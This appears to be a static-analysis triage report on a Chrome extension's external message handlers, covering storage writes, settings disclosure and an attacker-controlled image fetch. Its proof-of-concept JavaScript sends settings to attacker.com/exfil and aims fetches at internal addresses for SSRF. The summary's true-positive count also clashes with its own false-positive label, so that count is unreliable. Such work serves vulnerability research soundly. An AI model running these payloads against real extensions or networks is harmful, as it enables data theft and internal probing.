# CoCo Analysis: bglneidhakmhdnbiggoldnkdgbckdeck

## Summary

- **Overall Assessment:** TRUE POSITIVE (4 TRUE POSITIVE)
- **Total Sinks Detected:** 6 (3 storage write flows, 2 storage read/disclosure flows, 1 fetch flow)

---

## Sink Group 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (3 flows)

**CoCo Trace:**
```
from bg_chrome_runtime_MessageExternal to chrome_storage_local_set_sink
$FilePath$/.../bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 1293    setParams[request.key] = !!request.value;
Line 1325    var newActivationCommand = parseInt(request.value) || ACTIVATE_SAMI;
Line 1332    var newDetectionSensitivity = parseInt(request.value) || 30;
Line 1344    chrome.storage.local.set(setParams);
```

**Code:**
```javascript
// manifest.json (lines 55-56)
"externally_connectable": {
    "matches": ["*://*.gamingtribe.com/*"]  // ← Web pages on gamingtribe.com can send messages
},

// Background script (bg.js, lines 911-915)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'setSettings') {  // ← Attacker can call this
        setSettings(request);  // ← Calls setSettings with attacker-controlled data
    } else if (request.type === 'getSettings') {
        return getSettings(request, sendResponse);
    }
    // ... other handlers
});

// setSettings function (bg.js, lines 1291-1345)
function setSettings(request) {
    var setParams = {};
    setParams[request.key] = !!request.value;  // ← Attacker controls key and value

    if (request.key === 'globalMediaKeys') {
        if (request.value) {
            chrome.commands.onCommand.addListener(keyPressHandler);
        } else {
            chrome.commands.onCommand.removeListener(keyPressHandler);
        }
    } else if (request.key === 'musicNotifications') {
        musicNotifications = !!request.value;
        // ...
    } else if (request.key === 'voiceActivation') {
        // ...
    } else if (request.key === 'voiceActivationCommand') {
        var newActivationCommand = parseInt(request.value) || ACTIVATE_SAMI;  // ← Attacker-controlled
        // ...
        setParams[request.key] = newActivationCommand;
    } else if (request.key === 'detectionSensitivity') {
        var newDetectionSensitivity = parseInt(request.value) || 30;  // ← Attacker-controlled
        // ...
        setParams[request.key] = newDetectionSensitivity;
    } else if (request.key === 'autoSpeak') {
        autoSpeak = !!request.value;
    } else if (request.key !== 'audioGranted') {
        return;
    }

    chrome.storage.local.set(setParams);  // ← Writes attacker-controlled data to storage
}
```

**Classification:** FALSE POSITIVE (incomplete storage exploitation)

**Reason:** While an attacker on `*.gamingtribe.com` web pages can send external messages to write arbitrary settings to `chrome.storage.local`, this only achieves storage pollution. The stored values control extension behavior (like enabling/disabling media keys, notifications, voice activation), but there's no demonstrated path where this data flows back to the attacker or causes code execution. The storage is only used for internal configuration.

---

## Sink Group 2: storage_local_get_source → sendResponseExternal_sink (2 flows)

**CoCo Trace:**
```
from storage_local_get_source to sendResponseExternal_sink
$FilePath$/.../bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 686     var storage_local_get_source = {'key':'value'};
Line 1353    resolve(!!result[key]);
Line 1357    resolve(parseInt(result[key]));
```

**Code:**
```javascript
// Background script (bg.js, lines 911-915)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'setSettings') {
        setSettings(request);
    } else if (request.type === 'getSettings') {  // ← Attacker can call this
        return getSettings(request, sendResponse);  // ← Reads storage and sends back
    }
    // ...
});

// getSettings function (bg.js, lines 1347-1364)
function getSettings(request, sendResponse) {
    var key = typeof request === 'string' ? request : request.key;  // ← Attacker controls key

    var promise = new Promise(function(resolve) {
        if (key === 'globalMediaKeys' || key === 'musicNotifications' || key === 'voiceActivation'
            || key === 'audioGranted' || key === 'autoSpeak') {
            chrome.storage.local.get(key, function(result) {
                resolve(!!result[key]);  // ← Reads from storage
            });
        } else if (key === 'voiceActivationCommand' || key === 'detectionSensitivity') {
            chrome.storage.local.get(key, function(result) {
                resolve(parseInt(result[key]));  // ← Reads from storage
            });
        }
    });

    if (typeof sendResponse === 'function') {
        promise.then(sendResponse);  // ← Sends storage data back to attacker
        return true;
    }
}
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Websites matching `*://*.gamingtribe.com/*` (per `externally_connectable` in manifest)

**Attack Vector:** External message from webpage

**Attack:**
```javascript
// On any webpage under *.gamingtribe.com, attacker can send external message
chrome.runtime.sendMessage(
    'bglneidhakmhdnbiggoldnkdgbckdeck',  // Extension ID
    {
        type: 'getSettings',
        key: 'voiceActivation'  // Can request any setting
    },
    function(response) {
        console.log('Stolen setting value:', response);
        // Exfiltrate user's extension settings
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({
                setting: 'voiceActivation',
                value: response
            })
        });
    }
);
```

**Impact:** Information disclosure of extension settings. Attacker on gamingtribe.com domain can read extension configuration values stored in `chrome.storage.local`, revealing user preferences like whether voice activation is enabled, media keys are active, notification settings, etc. This leaks privacy-sensitive information about user's extension usage.

---

## Sink 3: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
```
from bg_chrome_runtime_MessageExternal to fetch_resource_sink
$FilePath$/.../bglneidhakmhdnbiggoldnkdgbckdeck/opgen_generated_files/bg.js
Line 937     if (typeof request.track.artist !== 'undefined') {
Line 943     getImageBlob(request.track.artwork_url)
```

**Code:**
```javascript
// Background script (bg.js, lines 911-948)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type === 'setSettings') {
        setSettings(request);
    } else if (request.type === 'getSettings') {
        return getSettings(request, sendResponse);
    } else if (request.type === 'music') {  // ← Attacker can trigger this
        if (request.change === 'state') {
            // ...
        } else if (request.change === 'track') {  // ← Attacker-controlled
            if (!musicNotifications) {
                return;
            }

            getMusicActiveTab().then(function(tabId) {
                if (!tabId) {
                    chrome.tabs.executeScript(sender.tab.id, {file: 'js/content.js'});
                }
            });

            var trackTitle;
            if (typeof request.track.artist !== 'undefined') {  // ← Attacker-controlled
                trackTitle = request.track.artist + ' – ' + request.track.title;
            } else {
                trackTitle = request.track.title;
            }

            getImageBlob(request.track.artwork_url)  // ← Attacker-controlled URL for fetch
                .then(function(blobUrl) {
                    showTrackNotification(trackTitle, blobUrl);
                });

            return true;
        }
    }
    // ...
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Websites matching `*://*.gamingtribe.com/*` (per `externally_connectable` in manifest)

**Attack Vector:** External message from webpage

**Attack:**
```javascript
// On any webpage under *.gamingtribe.com, attacker can trigger privileged fetch
chrome.runtime.sendMessage(
    'bglneidhakmhdnbiggoldnkdgbckdeck',  // Extension ID
    {
        type: 'music',
        change: 'track',
        track: {
            artist: 'Attacker',
            title: 'Malicious',
            artwork_url: 'http://internal-server/admin/secret-data'  // ← Attacker-controlled URL
        }
    }
);
```

**Impact:** Privileged cross-origin request to arbitrary attacker-controlled URL. The extension will fetch the image from the attacker-specified URL with elevated privileges, bypassing CORS restrictions. Attacker can probe internal networks, access services not accessible from the web, or use the extension as a proxy for privileged requests. Note: The musicNotifications setting must be enabled for this attack to work.

---

## Combined Exploitation: Storage Write + Storage Read + Fetch

**Classification:** TRUE POSITIVE

**Complete Attack Chain:**
```javascript
// Step 1: Enable musicNotifications to allow fetch attack
chrome.runtime.sendMessage('bglneidhakmhdnbiggoldnkdgbckdeck', {
    type: 'setSettings',
    key: 'musicNotifications',
    value: true
}, function() {
    console.log('Music notifications enabled');

    // Step 2: Trigger privileged fetch to internal resource
    chrome.runtime.sendMessage('bglneidhakmhdnbiggoldnkdgbckdeck', {
        type: 'music',
        change: 'track',
        track: {
            artist: 'Internal',
            title: 'Resource',
            artwork_url: 'http://192.168.1.1/admin/config'
        }
    });

    // Step 3: Exfiltrate settings
    chrome.runtime.sendMessage('bglneidhakmhdnbiggoldnkdgbckdeck', {
        type: 'getSettings',
        key: 'voiceActivation'
    }, function(value) {
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({voiceActivation: value})
        });
    });
});
```

**Impact:**
1. **Storage manipulation:** Attacker enables music notifications to bypass fetch protection
2. **SSRF:** Attacker triggers privileged fetch to internal/arbitrary URLs
3. **Information disclosure:** Attacker reads extension settings

---

## Additional Notes

The extension uses `externally_connectable` to restrict external messages to `*://*.gamingtribe.com/*` web pages only. However, per the methodology, domain restrictions are not security boundaries - we analyze IF exploitable when attacker controls pages on that domain. Any malicious content injected on gamingtribe.com (via XSS, compromised subdomain, or user-generated content) can exploit these vulnerabilities.
